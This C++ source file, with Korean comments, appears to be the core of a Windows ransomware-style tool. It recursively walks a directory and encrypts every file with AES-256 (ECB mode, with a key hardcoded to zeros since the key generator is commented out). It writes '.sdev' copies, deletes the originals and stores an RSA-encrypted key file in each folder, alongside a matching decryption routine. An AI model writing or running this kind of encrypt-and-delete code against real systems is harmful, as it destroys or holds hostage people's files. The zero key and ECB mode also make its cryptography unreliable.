#define _CRT_SECURE_NO_WARNINGS
#include "fileEnc.hpp"
#include <map>


// 사용자 이름 가져오기
string getUserName() {
    DWORD username_len = UNLEN + 1;
    char userName[UNLEN + 1];

    GetUserNameA(userName, &username_len);
    return userName;
}


void SaveEncKey(RSA* pubKey, string& dirName, unsigned char* key) {
    unsigned char encryptedData[256] = { 0x01 , };
    // RSA 암호화
    int result = RSA_public_encrypt(32, key, encryptedData, pubKey, RSA_PKCS1_OAEP_PADDING);
    if (result == -1) {
        std::cerr << "Error encrypting data." << std::endl;
        RSA_free(pubKey);
    }

    string name = dirName + "\\";
    HANDLE handle = CreateFileA((name + "dirkey.key").c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (handle == INVALID_HANDLE_VALUE) {
        cout << "파일 오픈 실패" << endl;
        return;
    }

    WriteFile(handle, encryptedData, sizeof(encryptedData), NULL, NULL);
    CloseHandle(handle);
}


void GetDecKey(RSA* priKey, string& dirName, unsigned char* key) {
    DWORD nRead;
    unsigned char buf[256] = { 0x00, };

    string name = dirName + "\\dirkey.key";
    HANDLE handle = CreateFileA((name).c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (handle == INVALID_HANDLE_VALUE) {
        cout << GetLastError();
        cout << "파일 오픈 실패" << endl;
        return;
    }
    if (ReadFile(handle, buf, 256, &nRead, NULL) != TRUE) {
        cout << "read dec key error" << "\n";
    }

    int result = RSA_private_decrypt(256, buf, key, priKey, RSA_PKCS1_OAEP_PADDING);
    if (result == -1) {
        std::cerr << "Error decrypting data." << std::endl;
        RSA_free(priKey);
    }

    CloseHandle(handle);
}


void EncryptDir(RSA* pubKey, string& dirName) {
    unsigned char _key[32] = {0x00, }; // generateKey();
    
    cout << "pubKey in encrypt dir " << endl;
    cout << pubKey << endl;

    SaveEncKey(pubKey, dirName, _key);

    WIN32_FIND_DATAA data;
    HANDLE hFind = nullptr;
    string folderName;

    string folder;
    string file;

    cout << "\n\n ********** " + dirName + " **********" << endl;
    hFind = FindFirstFileA((dirName + "\\*").c_str(), &data);

    if (hFind == INVALID_HANDLE_VALUE)return;

    do {
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            folder = data.cFileName;
            if (folder == "." || folder == "..") {
                continue;
            }
            folderName = dirName + "\\" + folder;
            cout << "[Folder] " << folderName << endl;
            EncryptDir(pubKey, folderName);
        }
        else {
            file = data.cFileName;
            cout << "[File] " << file << endl;
            EncryptFileByAES(_key, dirName, file);
        }
    } while (FindNextFileA(hFind, &data) != 0);

    FindClose(hFind);
}


void EncryptFileByAES(unsigned char* key, string& dirName, string& fileName) {

    HANDLE handle1;
    HANDLE handle2;
    DWORD size;
    DWORD nRead;
    DWORD nWrite;
    string name = dirName + "\\" + fileName;
    unsigned char* plain_buf;
    unsigned char* cipher_buf;

    // 파일 이름 중 마지막 .위치 
    size_t lastDot = name.find_last_of('.');
    string fileNameStem;
    string fileExtension;

    if (lastDot != string::npos) {
        fileNameStem = name.substr(0, lastDot);
        fileExtension = name.substr(lastDot + 1);
        if (fileExtension == "sdev" || fileExtension == "key") return;
    }
    else {
        fileNameStem = name;
    }
    // 암호화 할 파일 불러오기
    handle1 = CreateFileA(name.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    // 암호화 후 작성할 파일 불러오기 확장자 .sdev 로 설정
    handle2 = CreateFileA((fileNameStem + ".sdev").c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (handle1 == INVALID_HANDLE_VALUE || handle2 == INVALID_HANDLE_VALUE) {
        cout << "파일 오픈 실패" << endl;
        return;
    }

    // 파일 사이즈 확인
    size = GetFileSize(handle1, NULL);
    size += 16 - size % 16;

    // 파일 사이즈 만큼 버퍼 할당
    plain_buf = (unsigned char*)calloc(size, sizeof(char));
    cipher_buf = (unsigned char*)calloc(size, sizeof(char));

    // 암호화할 파일 읽어오기
    if (ReadFile(handle1, plain_buf, size, &nRead, NULL) != TRUE) {
        cout << "fail to file open " << endl;
        return;
    }
    else {
        // 암호화
        EncryptText(plain_buf, (unsigned int)size, key, cipher_buf);
        if (WriteFile(handle2, cipher_buf, nRead, &nWrite, NULL) != TRUE)
            cout << "fail to file write" << endl;
        else
            cout << fileName << " file is encrypted" << endl;
    }
    CloseHandle(handle1);
    CloseHandle(handle2);

    DeleteFileA(name.c_str());

    free(plain_buf);
    free(cipher_buf);
}


// 파일 암호화
void EncryptText(unsigned char* plain, unsigned int plainLength, unsigned char* key, unsigned char* cipher) {
    AES aes(AESKeyLength::AES_256);
    memcpy(cipher, aes.EncryptECB(plain, plainLength, key), plainLength);
}


void DecryptDir(RSA* priKey, string& dirName) {
    unsigned char _key[32] = { 0x02, };
    GetDecKey(priKey, dirName, _key);

    WIN32_FIND_DATAA data;
    HANDLE hFind = nullptr;
    string folderName;

    vector<string> folders;
    vector<string> files;

    cout << "\n\n ********** " + dirName + " **********" << endl;
    hFind = FindFirstFileA((dirName + "\\*").c_str(), &data);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            folders.push_back(data.cFileName);
        else
            files.push_back(data.cFileName);
    } while (FindNextFileA(hFind, &data) != 0);
    FindClose(hFind);


    // 파일 출력
    for (string& file : files){
        cout << "[File] " << file << endl;
        DecryptFileByAES(_key, dirName, file);
    }
    DeleteFileA((dirName+"\\dirkey.key").c_str());

    // 폴더 출력
    for (string& folder : folders) {
        if (folder == "." || folder == "..") {
            continue;
        }
        folderName = dirName + "\\" + folder;
        cout << "[Folder] " << folderName << endl;
        DecryptDir(priKey, folderName);
    }
}


std::map<std::vector<unsigned char>, std::string> fileSignatures = {
    {{0xFF, 0xD8, 0xFF, 0xE0}, "jpeg"},
    {{0xFF, 0xD8, 0xFF, 0xE8}, "jpeg"},
    {{0x47, 0x49, 0x46, 0x38, 0x37, 0x61}, "gif"},
    {{0x47, 0x49, 0x46, 0x38, 0x39, 0x61}, "gif"},
    {{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A}, "png"},
    {{0x25, 0x50, 0x44, 0x46, 0x2D, 0x31, 0x2E}, "pdf"},
    {{0x50, 0x4B, 0x03, 0x04}, "zip"},
    {{0x52, 0x61, 0x72, 0x21, 0x1A, 0x07, 0x00}, "rar"},
    {{0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x06, 0x00}, "docx"}
};


string CheckFileSignature(vector<unsigned char> header) {
    
    for (const auto& pair : fileSignatures) {
        bool check = true;
        for (int i = 0; i < pair.first.size(); i++) {
            if (header[i] != pair.first[i]) {
                check = false;
                break;
            }
        }
        if (check) return pair.second;
    }
    return "NULL";
}


void DecryptFileByAES(unsigned char* key, string& dirName, string& fileName) {

    HANDLE handle1;
    HANDLE handle2;
    DWORD size;
    DWORD nRead;
    DWORD nWrite;
    string name = dirName + "\\" + fileName;
    unsigned char* plain_buf;
    unsigned char* cipher_buf;

    size_t lastDot = name.find_last_of('.');
    string fileNameStem;
    string fileExtension;

    if (lastDot != string::npos) {
        fileNameStem = name.substr(0, lastDot);
        fileExtension = name.substr(lastDot + 1);
        if (fileExtension != "sdev") return;
    }

    // 복호화 할 파일 불러오기
    handle1 = CreateFileA(name.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);

    if (handle1 == INVALID_HANDLE_VALUE) {
        cout << "파일 오픈 실패" << endl;
        return;
    }

    // 파일 사이즈 확인
    size = GetFileSize(handle1, NULL);
    size += 16 - size % 16;

    // 파일 사이즈 만큼 버퍼 할당
    plain_buf = (unsigned char*)calloc(size, sizeof(char));
    cipher_buf = (unsigned char*)calloc(size, sizeof(char));

    // 복호화할 파일 읽어오기
    if (ReadFile(handle1, plain_buf, size, &nRead, NULL) != TRUE)
    {
        cout << "fail to file open " << endl;
        return;
    }
    else
    {
        // 복호화
        DecryptText(plain_buf, (unsigned int)size, key, cipher_buf);
        fileExtension = CheckFileSignature(vector<unsigned char>(cipher_buf, cipher_buf + 8));
        fileExtension = (fileExtension == "NULL") ? "dec" : fileExtension;
        handle2 = CreateFileA((fileNameStem + "." + fileExtension).c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

        // 암호화한 내용 .{확장자} 파일에 작성
        if (WriteFile(handle2, cipher_buf, nRead, &nWrite, NULL) != TRUE)
        {
            cout << "fail to file write" << endl;
        }
        else {
            cout << fileName << " file is decrypted" << endl;
        }
    }
    CloseHandle(handle1);
    CloseHandle(handle2);

    DeleteFileA(name.c_str());

    free(plain_buf);
    free(cipher_buf);

}


// 파일 암호화
void DecryptText(unsigned char* plain, unsigned int plainLength, unsigned char* key, unsigned char* cipher) {
    AES aes(AESKeyLength::AES_256);
    // TODO : ecb -> cbc
    memcpy(cipher, aes.DecryptECB(plain, plainLength, key), plainLength);
}
